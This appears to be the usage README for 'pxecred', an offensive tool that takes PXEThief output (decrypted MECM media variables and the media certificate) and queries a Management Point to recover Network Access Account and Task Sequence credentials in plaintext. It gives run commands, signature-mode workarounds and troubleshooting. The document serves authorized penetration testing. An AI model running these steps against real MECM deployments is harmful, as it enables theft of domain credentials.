# pxecred usage

## 1. Obtain the inputs

`pxecred` starts after the PXE stage. You need:

- `variables.xml` — the decrypted media variables file
- the media PFX (the file PXEThief writes as `<site>_<media-guid>_SMSTSMediaPFX.pfx`)

These are normally produced by PXEThief mode 1/2/3 (or mode 4 for standalone
media). The extraction step is not included in `pxecred`; run it on Windows or a
compatible platform first.

If you do not pass `--pfx`, `pxecred` extracts `_SMSTSMediaPFX` from
`variables.xml` and writes it to `<output>/media.pfx`.

## 2. Run

```bash
python3 pxecred.py \
  --variables variables.xml \
  --pfx P01_media_SMSTSMediaPFX.pfx \
  --mp http://192.168.0.41 \
  --output findings
```

If the Management Point hostname from `variables.xml` resolves on your machine,
you can omit `--mp`. In most lab/attack-host setups, pass the MECM IP explicitly.

The PFX password defaults to the first 31 characters of `_SMSMediaGuid`, which is
what MECM uses for the media certificate. Override it only if your PFX differs:

```bash
python3 pxecred.py --pfx custom.pfx --pfx-password '...'
```

## 3. Output

`pxecred` prints NAA and Task Sequence credentials and writes decrypted policies:

```text
findings/
  policy_assignments.xml
  policy_assignments.raw.xml
  NAAConfig.xml
  TaskSequence.xml
  TaskSequence_Install_win10_OS_image-P0120001.xml
  TaskSequence_policy_Install_win10_OS_image-P0120001.xml
  *.raw   # raw HTTP response bodies (sensitive)
  *.dec   # decrypted CMS payloads before XML cleanup
```

Treat the entire output directory as sensitive. It can contain plaintext
credentials and the media certificate.

## Signature modes

The MECM Management Point validates client token signatures. The defaults are
chosen for modern site servers:

```text
--sig-mode auto        raw-little -> std-little -> raw-big -> std-big
--hash sha256
```

If the policy request fails with 401/403/500:

```bash
# Standard PKCS#1 v1.5 with SHA-256
python3 pxecred.py ... --sig-mode std-little

# Very old site servers / alternate signing path
python3 pxecred.py ... --hash sha1
```

The tool prints the exact mode that succeeded.

## Wireless and DNS notes

- If `SMSTSMP` is `http://MECM.example.lab`, your attack host may not resolve it.
  Use `--mp http://<MECM-IP>`.
- The Management Point policy endpoint is HTTP in many labs. For HTTPS with a
  private CA, ensure the URL and trust chain are usable from your host.
- The tool is stateless between runs; it does not register a client or write to
  MECM.

## Linux dependencies

Wheels are available for common Linux distributions. If `lxml` has no wheel for
your platform:

```bash
sudo apt install build-essential libxml2-dev libxslt1-dev python3-dev
```

Then install the requirements again.

## Smoke test

```bash
python3 pxecred.py --help
python3 -m unittest discover -s tests -v
```

## Troubleshooting

| Symptom | Check |
|---|---|
| `MPKEYINFORMATIONMEDIA failed` | Wrong `--mp`, DNS, firewall on 80/443 |
| Policy request 401/500 | `--sig-mode`, `--hash sha1`, clock skew |
| CMS decrypt failed | Wrong PFX/password; not the media certificate |
| Empty NAA/TS output | Policies not assigned to Unknown Computers |
| `FileNotFoundError` for XML | Run from the directory containing `variables.xml` or pass `--variables` |

## Authorized use

This is an offensive security utility. Use it only against systems you own or
have explicit written authorization to test. The authors accept no liability for
misuse or damage.
